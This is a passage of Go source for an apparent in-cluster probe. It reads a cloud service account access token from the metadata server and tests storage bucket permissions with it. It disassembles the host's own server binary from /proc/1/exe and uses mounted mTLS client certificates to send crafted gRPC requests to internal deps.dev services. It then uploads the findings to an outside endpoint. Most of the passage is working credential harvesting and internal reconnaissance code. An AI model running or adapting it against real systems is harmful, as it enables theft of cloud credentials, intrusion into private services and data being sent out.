		(contentType == "application/grpc" || strings.HasPrefix(contentType, "application/grpc+"))
}

func buildURLLookupRequest(canaryURL string) []byte {
	return appendStringField(nil, 2, canaryURL)
}

func buildCoordinateLookupRequest() []byte {
	request := []byte{}
	request = appendStringField(request, 7, targetRegistry)
	request = appendStringField(request, 8, targetModuleName)
	request = appendStringField(request, 9, targetVersion)
	request = appendVarintField(request, 10, lookupRecordLimit)
	return request
}

func buildTargetMetadata() []byte {
	metadata := []byte{}
	metadata = appendStringField(metadata, 2, targetRegistry)
	metadata = appendVarintField(metadata, 3, 1) // GO_MODULE
	metadata = appendStringField(metadata, 4, targetModuleName)
	metadata = appendVarintField(metadata, 5, 1) // CONCRETE
	metadata = appendStringField(metadata, 6, targetVersion)
	return metadata
}

func buildTargetDownloadRequest(canaryURL string) []byte {
	request := []byte{}
	request = appendStringField(request, 1, canaryURL)
	request = appendBytesField(request, 4, buildTargetMetadata())
	request = appendVarintField(request, 5, downloadPolicyOnlyNew)
	request = appendStringField(request, 6, downloadSource)
	redirect := appendVarintField(nil, 1, redirectFollowNone)
	request = appendBytesField(request, 8, redirect)
	return request
}

func buildTargetStreamRequest(canaryURL string) []byte {
	request := appendStringField(nil, 1, canaryURL)
	request = appendBytesField(request, 2, buildTargetMetadata())
	return request
}

type decodedWireMessage struct {
	fields []decodedWireField
}

type decodedWireField struct {
	number int
	wire   int
	varint uint64
	value  []byte
	child  *decodedWireMessage
}

func decodeWireMessage(data []byte, depth int) (*decodedWireMessage, bool) {
	if depth > maximumWireDepth {
		return nil, false
	}
	message := &decodedWireMessage{}
	for offset := 0; offset < len(data); {
		key, size := binary.Uvarint(data[offset:])
		if size <= 0 {
			return nil, false
		}
		offset += size
		number := int(key >> 3)
		wire := int(key & 7)
		if number < 1 || number > (1<<29)-1 {
			return nil, false
		}
		field := decodedWireField{number: number, wire: wire}
		switch wire {
		case 0:
			field.varint, size = binary.Uvarint(data[offset:])
			if size <= 0 {
				return nil, false
			}
			offset += size
		case 1:
			if len(data)-offset < 8 {
				return nil, false
			}
			offset += 8
		case 2:
			length, lengthSize := binary.Uvarint(data[offset:])
			if lengthSize <= 0 {
				return nil, false
			}
			offset += lengthSize
			if length > uint64(len(data)-offset) {
				return nil, false
			}
			field.value = data[offset : offset+int(length)]
			offset += int(length)
			if len(field.value) > 0 && depth < maximumWireDepth {
				if child, valid := decodeWireMessage(field.value, depth+1); valid && len(child.fields) > 0 {
					field.child = child
				}
			}
		case 5:
			if len(data)-offset < 4 {
				return nil, false
			}
			offset += 4
		default:
			return nil, false
		}
		message.fields = append(message.fields, field)
	}
	return message, true
}

func decodeGRPCMessages(body []byte) ([]*decodedWireMessage, error) {
	var messages []*decodedWireMessage
	for offset := 0; offset < len(body); {
		if len(body)-offset < 5 {
			return nil, errors.New("truncated gRPC frame header")
		}
		if body[offset] != 0 {
			return nil, errors.New("compressed gRPC response was not allowed")
		}
		length := int(binary.BigEndian.Uint32(body[offset+1 : offset+5]))
		offset += 5
		if length < 0 || length > len(body)-offset {
			return nil, errors.New("truncated gRPC frame payload")
		}
		message, valid := decodeWireMessage(body[offset:offset+length], 0)
		if !valid {
			return nil, errors.New("gRPC payload was not valid bounded protobuf wire data")
		}
		messages = append(messages, message)
		offset += length
	}
	return messages, nil
}

func knownWireText(value []byte) string {
	if !utf8.Valid(value) {
		return ""
	}
	switch string(value) {
	case bytemanCanaryURL:
		return "[canary-url]"
	case targetRegistry, targetModuleName, targetVersion:
		return string(value)
	default:
		return ""
	}
}

func summarizeWireMessages(messages []*decodedWireMessage) ([]wireFieldDigest, error) {
	var digests []wireFieldDigest
	for frame, message := range messages {
		prefix := "frame[" + strconv.Itoa(frame) + "]"
		if err := walkWireMessage(message, prefix, &digests); err != nil {
			return nil, err
		}
	}
	return digests, nil
}

func walkWireMessage(message *decodedWireMessage, prefix string, digests *[]wireFieldDigest) error {
	occurrences := map[int]int{}
	for _, field := range message.fields {
		index := occurrences[field.number]
		occurrences[field.number]++
		if field.wire != 2 {
			continue
		}
		if len(*digests) >= maximumWireFields {
			return errors.New("protobuf wire field limit exceeded")
		}
		component := strconv.Itoa(field.number)
		path := prefix + "." + component + "[" + strconv.Itoa(index) + "]"
		digest := sha256.Sum256(field.value)
		*digests = append(*digests, wireFieldDigest{
			Path: path, Bytes: len(field.value), SHA256: hex.EncodeToString(digest[:]),
			Text: knownWireText(field.value), Nested: field.child != nil,
		})
		if field.child != nil {
			if err := walkWireMessage(field.child, path, digests); err != nil {
				return err
			}
		}
	}
	return nil
}

type lookupBodyAnalysis struct {
	Wire          []wireFieldDigest
	RecordCount   int
	MatchCount    int
	RecordsSHA256 string
	MatchSHA256   string
	MatchPath     string
	RecordSHA256  string
	DigestSHA256  string
	IDSHA256      string
}

type downloadRecordIdentity struct {
	Matched      bool
	RecordSHA256 string
	DigestSHA256 string
	IDSHA256     string
}

type downloadBodyAnalysis struct {
	Wire       []wireFieldDigest
	Identity   downloadRecordIdentity
	StatusSet  bool
	StatusCode uint64
}

func targetMetadataMatches(message *decodedWireMessage) bool {
	counts := map[int]int{}
	matched := map[int]bool{}
	for _, field := range message.fields {
		switch field.number {
		case 1:
			// The system enum is optional legacy metadata. It may be present once,
			// but package type/name/version below are the B-coordinate authority.
			counts[1]++
			matched[1] = field.wire == 0
		case 2:
			counts[2]++
			matched[2] = field.wire == 2 && string(field.value) == targetRegistry
		case 3:
			counts[3]++
			matched[3] = field.wire == 0 && field.varint == 1 // GO_MODULE
		case 4:
			counts[4]++
			matched[4] = field.wire == 2 && string(field.value) == targetModuleName
		case 5:
			counts[5]++
			matched[5] = field.wire == 0 && field.varint == 1 // CONCRETE
		case 6:
			counts[6]++
			matched[6] = field.wire == 2 && string(field.value) == targetVersion
		default:
			return false
		}
	}
	if counts[1] > 1 || (counts[1] == 1 && !matched[1]) {
		return false
	}
	for _, number := range []int{2, 3, 4, 5, 6} {
		if counts[number] != 1 || !matched[number] {
			return false
		}
	}
	return true
}

func analyzeTargetDownload(value []byte) downloadRecordIdentity {
	identity := downloadRecordIdentity{}
	message, valid := decodeWireMessage(value, 0)
	if !valid {
		return identity
	}
	counts := map[int]int{}
	matched := map[int]bool{}
	var digestValue, idValue []byte
	for _, field := range message.fields {
		switch field.number {
		case 1:
			counts[1]++
			matched[1] = field.wire == 2 && string(field.value) == bytemanCanaryURL
		case 2:
			counts[2]++
			matched[2] = field.wire == 2 && len(field.value) > 0
			digestValue = field.value
		case 3:
			counts[3]++
			matched[3] = field.wire == 0 && field.varint == targetCanaryBytes
		case 5:
			counts[5]++
			matched[5] = field.wire == 0 && field.varint == downloadHTTPStatus
		case 12:
			counts[12]++
			if field.wire == 2 {
				metadata, valid := decodeWireMessage(field.value, 0)
				matched[12] = valid && targetMetadataMatches(metadata)
			}
		case 17:
			counts[17]++
			matched[17] = field.wire == 2 && len(field.value) > 0
			idValue = field.value
		}
	}
	for _, number := range []int{1, 2, 3, 5, 12, 17} {
		if counts[number] != 1 || !matched[number] {
			return identity
		}
	}
	recordDigest := sha256.Sum256(value)
	digestDigest := sha256.Sum256(digestValue)
	idDigest := sha256.Sum256(idValue)
	identity.Matched = true
	identity.RecordSHA256 = hex.EncodeToString(recordDigest[:])
	identity.DigestSHA256 = hex.EncodeToString(digestDigest[:])
	identity.IDSHA256 = hex.EncodeToString(idDigest[:])
	return identity
}

func analyzeDownloadBody(body []byte) (downloadBodyAnalysis, error) {
	analysis := downloadBodyAnalysis{}
	messages, err := decodeGRPCMessages(body)
	if err != nil {
		return analysis, err
	}
	if len(messages) != 1 {
		return analysis, errors.New("Download response did not contain exactly one unary gRPC frame")
	}
	analysis.Wire, err = summarizeWireMessages(messages)
	if err != nil {
		return analysis, err
	}
	recordCount := 0
	statusCount := 0
	for _, field := range messages[0].fields {
		switch field.number {
		case 1:
			recordCount++
			if field.wire != 2 {
				return analysis, errors.New("DownloadResponse record field had the wrong wire type")
			}
			analysis.Identity = analyzeTargetDownload(field.value)
		case 3:
			statusCount++
			if field.wire != 0 {
				return analysis, errors.New("DownloadResponse status_code had the wrong wire type")
			}
			analysis.StatusSet = true
			analysis.StatusCode = field.varint
		default:
			return analysis, errors.New("DownloadResponse contained a field outside record 1 and status_code 3")
		}
	}
	if recordCount != 1 || statusCount != 1 || analysis.StatusCode != downloadHTTPStatus || !analysis.Identity.Matched {
		return analysis, errors.New("DownloadResponse omitted one exact successful identified B record")
	}
	return analysis, nil
}

func writeFingerprintRecord(hasher io.Writer, value []byte) {
	var length [4]byte
	binary.BigEndian.PutUint32(length[:], uint32(len(value)))
	_, _ = hasher.Write(length[:])
	_, _ = hasher.Write(value)
}

func analyzeLookupBody(body []byte) (lookupBodyAnalysis, error) {
	analysis := lookupBodyAnalysis{}
	messages, err := decodeGRPCMessages(body)
	if err != nil {
		return analysis, err
	}
	if len(messages) == 0 {
		return analysis, errors.New("streaming Lookup response contained no gRPC frames")
	}
	analysis.Wire, err = summarizeWireMessages(messages)
	if err != nil {
		return analysis, err
	}
	recordsHasher := sha256.New()
	matchesHasher := sha256.New()
	for frameIndex, message := range messages {
		fieldIndex := 0
		for _, field := range message.fields {
			if field.number != 1 {
				return analysis, errors.New("LookupResponse contained a field outside repeated Download field 1")
			}
			if field.wire != 2 {
				return analysis, errors.New("LookupResponse Download field had the wrong wire type")
			}
			analysis.RecordCount++
			writeFingerprintRecord(recordsHasher, field.value)
			identity := analyzeTargetDownload(field.value)
			if !identity.Matched {
				fieldIndex++
				continue
			}
			analysis.MatchCount++
			writeFingerprintRecord(matchesHasher, field.value)
			analysis.MatchPath = "frame[" + strconv.Itoa(frameIndex) + "].1[" + strconv.Itoa(fieldIndex) + "]"
			analysis.RecordSHA256 = identity.RecordSHA256
			analysis.DigestSHA256 = identity.DigestSHA256
			analysis.IDSHA256 = identity.IDSHA256
			fieldIndex++
		}
	}
	if analysis.RecordCount > 0 {
		analysis.RecordsSHA256 = hex.EncodeToString(recordsHasher.Sum(nil))
	}
	if analysis.MatchCount > 0 {
		analysis.MatchSHA256 = hex.EncodeToString(matchesHasher.Sum(nil))
	}
	if analysis.MatchCount != 1 {
		analysis.MatchPath = ""
		analysis.RecordSHA256 = ""
		analysis.DigestSHA256 = ""
		analysis.IDSHA256 = ""
	}
	return analysis, nil
}

func exactPayload(value []byte, expectedBytes int, expectedSHA256 string) bool {
	if len(value) != expectedBytes {
		return false
	}
	digest := sha256.Sum256(value)
	return hex.EncodeToString(digest[:]) == expectedSHA256
}

func analyzeStreamBody(body []byte) ([]wireFieldDigest, []byte, string, error) {
	return analyzeStreamBodyExpected(body, targetCanaryBytes, targetCanarySHA256)
}

func analyzeStreamBodyExpected(body []byte, expectedBytes int, expectedSHA256 string) ([]wireFieldDigest, []byte, string, error) {
	messages, err := decodeGRPCMessages(body)
	if err != nil {
		return nil, nil, "", err
	}
	if len(messages) == 0 {
		return nil, nil, "", errors.New("Stream response contained no gRPC frames")
	}
	digests, err := summarizeWireMessages(messages)
	if err != nil {
		return nil, nil, "", err
	}
	payload := []byte{}
	for _, message := range messages {
		for _, field := range message.fields {
			switch field.number {
			case 1:
				if field.wire != 2 {
					return digests, nil, "", errors.New("StreamResponse header field 1 had the wrong wire type")
				}
			case 2:
				if field.wire != 2 {
					return digests, nil, "", errors.New("StreamResponse data field 2 had the wrong wire type")
				}
				payload = append(payload, field.value...)
				if len(payload) > expectedBytes {
					return digests, nil, "", errors.New("StreamResponse data exceeded the exact canary size")
				}
			default:
				return digests, nil, "", errors.New("StreamResponse contained a field outside header 1 and data 2")
			}
		}
	}
	if !exactPayload(payload, expectedBytes, expectedSHA256) {
		return digests, nil, "", errors.New("top-level StreamResponse field 2 did not match the exact canary")
	}
	return digests, payload, "top-level-field-2", nil
}

type boundedBuffer struct {
	data      []byte
	maximum   int
	truncated bool
}

func (buffer *boundedBuffer) Write(value []byte) (int, error) {
	written := len(value)
	remaining := buffer.maximum - len(buffer.data)
	if remaining > 0 {
		if remaining > len(value) {
			remaining = len(value)
		}
		buffer.data = append(buffer.data, value[:remaining]...)
	}
	if remaining < len(value) {
		buffer.truncated = true
	}
	return written, nil
}

func runFixedTool(path string, arguments ...string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cancel()
	stdout := &boundedBuffer{maximum: 16 * 1024 * 1024}
	stderr := &boundedBuffer{maximum: 16 * 1024}
	command := exec.CommandContext(ctx, path, arguments...)
	command.Stdout = stdout
	command.Stderr = stderr
	err := command.Run()
	if ctx.Err() != nil {
		return nil, errors.New("fixed inspection tool timed out")
	}
	if err != nil {
		return nil, errors.New("fixed inspection tool failed")
	}
	if stdout.truncated {
		return nil, errors.New("fixed inspection output exceeded its limit")
	}
	return stdout.data, nil
}

func scanBoundedLines(data []byte, include func(string) bool, maximum int) []string {
	var result []string
	scanner := bufio.NewScanner(bytes.NewReader(data))
	scanner.Buffer(make([]byte, 4096), 64*1024)
	for scanner.Scan() && len(result) < maximum {
		line := strings.TrimSpace(scanner.Text())
		if len(line) > 512 {
			line = line[:512] + "[truncated]"
		}
		if line != "" && include(line) {
			result = append(result, line)
		}
	}
	return result
}

func instructionWindow(data []byte, marker string, before, after int) []string {
	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
	for index, line := range lines {
		if !strings.Contains(line, marker) {
			continue
		}
		start := index - before
		if start < 0 {
			start = 0
		}
		end := index + after + 1
		if end > len(lines) {
			end = len(lines)
		}
		return append([]string(nil), lines[start:end]...)
	}
	return nil
}

func runSessionDataflowInspection(report *probeReport) {
	result := &inspectionResult{}
	report.Inspection = result
	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.Symbols = scanBoundedLines(nmOutput, func(line string) bool {
		return strings.Contains(line, "sos.googlesource.com/sos/server.dial") ||
			(strings.Contains(line, "sos.googlesource.com/sos/server.") && strings.Contains(line, "Session"))
	}, 64)
	dialOutput, err := runFixedTool(
		"/usr/bin/objdump", "-d", "-M", "intel",
		"--disassemble=sos.googlesource.com/sos/server.dial", "/proc/1/exe",
	)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 28, 16)
	callerOutput, err := runFixedTool(
		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble=main.main", "/proc/1/exe",
	)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.CallerWindow = instructionWindow(callerOutput, "server.dial", 24, 12)
	if len(result.Symbols) == 0 || len(result.DialWindow) == 0 || len(result.CallerWindow) == 0 {
		result.Error = "fixed inspection markers were incomplete"
		return
	}
	report.Reason = "bounded static session dataflow inspection completed"
}

func inspectMetadata(client *http.Client) (metadataResult, string) {
	result := metadataResult{}
	email, err := metadataText(client, "instance/service-accounts/default/email")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	result.Email = strings.TrimSpace(email)
	scopes, err := metadataText(client, "instance/service-accounts/default/scopes")
	if err == nil {
		for _, scope := range strings.Fields(scopes) {
			result.Scopes = append(result.Scopes, scope)
		}
	}
	tokenBody, err := metadataText(client, "instance/service-accounts/default/token")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	var token tokenResponse
	if json.Unmarshal([]byte(tokenBody), &token) != nil || token.AccessToken == "" || token.ExpiresIn <= 0 {
		result.Error = "metadata token response was invalid"
		return result, ""
	}
	result.TokenValid = true
	return result, token.AccessToken
}

func metadataText(client *http.Client, path string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	endpoint := "http://metadata.google.internal/computeMetadata/v1/" + path
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		return "", err
	}
	request.Header.Set("Metadata-Flavor", "Google")
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		return "", errors.New("metadata response too large")
	}
	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("metadata HTTP %d", response.StatusCode)
	}
	return string(body), nil
}

func testBucketPermissions(token, bucket string) bucketResult {
	result := bucketResult{Bucket: bucket}
	values := url.Values{}
	for _, permission := range bucketPermissions {
		values.Add("permissions", permission)
	}
	endpoint := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(bucket) + "/iam/testPermissions?" + values.Encode()
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Authorization", "Bearer "+token)
	request.Header.Set("User-Agent", probeUserAgent)
	response, err := http.DefaultClient.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		result.Error = "permission response too large"
		return result
	}
	var decoded struct {
		Permissions []string `json:"permissions"`
		Error       *struct {
			Code   int    `json:"code"`
			Status string `json:"status"`
		} `json:"error"`
	}
	if json.Unmarshal(body, &decoded) != nil {
		result.Error = "permission response was not JSON"
		return result
	}
	result.Granted = decoded.Permissions
	sort.Strings(result.Granted)
	if decoded.Error != nil {
		result.APIStatus = decoded.Error.Status
		if result.APIStatus == "" {
			result.APIStatus = strconv.Itoa(decoded.Error.Code)
		}
	}
	return result
}

func verifyLegacyLocalhost(state tls.ConnectionState, roots *x509.CertPool) error {
	if len(state.PeerCertificates) == 0 {
		return errors.New("Byteman TLS peer sent no certificate")
	}
	leaf := state.PeerCertificates[0]
	if leaf.Subject.CommonName != "localhost" {
		return errors.New("Byteman TLS legacy common name was not localhost")
	}
	intermediates := x509.NewCertPool()
	for _, certificate := range state.PeerCertificates[1:] {
		intermediates.AddCert(certificate)
	}
	_, err := leaf.Verify(x509.VerifyOptions{
		Roots:         roots,
		Intermediates: intermediates,
		KeyUsages:     []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	})
	if err != nil {
		return fmt.Errorf("Byteman TLS chain verification failed: %w", err)
	}
	return nil
}

func newMTLSClient(routeMode string) (*http.Client, string, error) {
	serviceHost, port, tlsServerName, useInjectedRPC, err := bytemanRoute(routeMode)
	if err != nil {
		return nil, "", err
	}
	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
	if err != nil {
		return nil, "", err
	}
	rootPEM, err := os.ReadFile("/etc/tls/server-pool/server-tls-pool.pem")
	if err != nil {
		return nil, "", err
	}
	// Trust only the workload-mounted private server pool. System roots would
	// weaken the legacy CN check into a public-root trust decision.
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(rootPEM) {
		return nil, "", errors.New("server pool contained no certificates")
	}
	var selected net.IP
	if useInjectedRPC {
		serviceHost = strings.TrimSpace(os.Getenv("RPC_SERVICE_HOST"))
		portText := strings.TrimSpace(os.Getenv("RPC_SERVICE_PORT_GRPC"))
		selected = net.ParseIP(serviceHost)
		parsedPort, parseErr := strconv.Atoi(portText)
		if selected == nil || !selected.IsPrivate() || selected.IsUnspecified() || selected.IsMulticast() {
			return nil, "", errors.New("injected RPC service was not a private IP")
		}
		if parseErr != nil || parsedPort < 1 || parsedPort > 65535 {
			return nil, "", errors.New("injected RPC service port was invalid")
		}
		port = parsedPort
	} else {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		addresses, resolveErr := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
		if resolveErr != nil {
			return nil, "", errors.New("direct Byteman service did not resolve")
		}
		for _, candidate := range addresses {
			if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
				selected = candidate.IP
				break
			}
		}
		if selected == nil {
			return nil, "", errors.New("direct Byteman service had no private address")
		}
	}
	address := net.JoinHostPort(selected.String(), strconv.Itoa(port))
	authorityHost := bytemanAuthorityHost(serviceHost, tlsServerName, useInjectedRPC)
	endpoint := "https://" + net.JoinHostPort(authorityHost, strconv.Itoa(port))
	rpcServiceHost = serviceHost
	rpcDialAddress = address
	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
	legacyLocalhost := routeMode == "byteman-localhost"
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{certificate},
		RootCAs:            roots,
		MinVersion:         tls.VersionTLS12,
		ServerName:         tlsServerName,
		InsecureSkipVerify: legacyLocalhost, // Verified below for the legacy CN-only service certificate.
	}
	if legacyLocalhost {
		tlsConfig.VerifyConnection = func(state tls.ConnectionState) error {
			return verifyLegacyLocalhost(state, roots)
		}
	}
	transport := &http.Transport{
		Proxy: nil,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return dialer.DialContext(ctx, network, address)
		},
		TLSClientConfig:   tlsConfig,
		ForceAttemptHTTP2: true,
	}
	return &http.Client{Transport: transport, Timeout: bytemanHTTPTimeout}, endpoint, nil
}

func bytemanAuthorityHost(serviceHost, tlsServerName string, useInjectedRPC bool) string {
	if useInjectedRPC {
		return tlsServerName
	}
	return serviceHost
}

func bytemanRoute(routeMode string) (string, int, string, bool, error) {
	switch routeMode {
	case "byteman-core-localhost":
		return "byteman-core.default.svc.cluster.local", 9000, "localhost", false, nil
	case "byteman-localhost":
		return "byteman.default.svc.cluster.local", 9000, "localhost", false, nil
	case "rpc-gateway":
		return "", 0, "rpc.deps.dev", true, nil
	case "byteman-oregon-gateway":
		return "", 0, "byteman.oregon.int.deps.dev", true, nil
	case "byteman-home-oregon-gateway":
		return "", 0, "byteman.home-oregon.int.deps.dev", true, nil
	case "byteman-iowa-gateway":
		return "", 0, "byteman.iowa.int.deps.dev", true, nil
	default:
		return "", 0, "", false, errors.New("route mode was not allowed")
	}
}

func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpcResult {
	result, _ := callGRPCRaw(client, endpoint, method, payload)
	return result
}

func callGRPCRaw(client *http.Client, endpoint, method string, payload []byte) (grpcResult, []byte) {
	return callGRPCRawLimits(client, endpoint, method, payload, bytemanGRPCTimeout, bytemanHTTPTimeout)
}

func callGRPCRawTimeout(client *http.Client, endpoint, method string, payload []byte, timeout time.Duration) (grpcResult, []byte) {
	return callGRPCRawLimits(client, endpoint, method, payload, timeout, timeout)
}

func callGRPCRawLimits(client *http.Client, endpoint, method string, payload []byte, grpcTimeout, httpTimeout time.Duration) (grpcResult, []byte) {
	result := grpcResult{Method: method}
	if grpcTimeout <= 0 || grpcTimeout > bytemanGRPCTimeout || httpTimeout < grpcTimeout || httpTimeout > bytemanHTTPTimeout {
		result.Error = "gRPC timeout was outside the bounded range"
		return result, nil
	}
	frame := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
	frame = append(frame, payload...)
	ctx, cancel := context.WithTimeout(context.Background(), httpTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return result, nil
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", probeUserAgent)
	if grpcTimeout == bytemanGRPCTimeout {
		request.Header.Set("Grpc-Timeout", "60S")
	} else {
		timeoutMS := grpcTimeout.Milliseconds()
		if timeoutMS < 1 {
			timeoutMS = 1
		}
		request.Header.Set("Grpc-Timeout", strconv.FormatInt(timeoutMS, 10)+"m")
	}
	response, err := client.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result, nil
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumBody+1))
	if err != nil {
		result.Error = cleanError(err)
		return result, nil
	}
	if len(body) > maximumBody {
		result.Error = "gRPC response too large"
		return result, nil
	}
	result.BodyBytes = len(body)
	digest := sha256.Sum256(body)
	result.BodySHA256 = hex.EncodeToString(digest[:])
	result.GRPCStatus = response.Trailer.Get("Grpc-Status")
	if result.GRPCStatus == "" {
		result.GRPCStatus = response.Header.Get("Grpc-Status")
	}
	result.GRPCMessage = response.Trailer.Get("Grpc-Message")
	if result.GRPCMessage == "" {
		result.GRPCMessage = response.Header.Get("Grpc-Message")
	}
	if decoded, decodeErr := url.QueryUnescape(result.GRPCMessage); decodeErr == nil {
		result.GRPCMessage = decoded
	}
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, sessionNonce, "[session]")
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, bytemanCanaryURL, "[canary-url]")
	if len(result.GRPCMessage) > 1024 {
		result.GRPCMessage = result.GRPCMessage[:1024] + "[truncated]"
	}
	result.Authenticated = grpcSucceeded(result)
	return result, body
}

func appendUvarint(destination []byte, value uint64) []byte {
	var buffer [binary.MaxVarintLen64]byte
	size := binary.PutUvarint(buffer[:], value)
	return append(destination, buffer[:size]...)
}

func appendVarintField(destination []byte, number int, value uint64) []byte {
	destination = appendUvarint(destination, uint64(number<<3))
	return appendUvarint(destination, value)
}

func appendBytesField(destination []byte, number int, value []byte) []byte {
	destination = appendUvarint(destination, uint64(number<<3|2))
	destination = appendUvarint(destination, uint64(len(value)))
	return append(destination, value...)
}

func appendStringField(destination []byte, number int, value string) []byte {
	return appendBytesField(destination, number, []byte(value))
}

func submitResult(endpoint string, result commandResult) error {
	encoded, err := json.Marshal(result)
	if err != nil || len(encoded) > maximumResult {
		return errors.New("result too large")
	}
	ctx, cancel := context.WithTimeout(context.Background(), resultTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(encoded))
	if err != nil {
		return err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       resultTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("result rejected with HTTP %d", response.StatusCode)
	}
	return nil
}
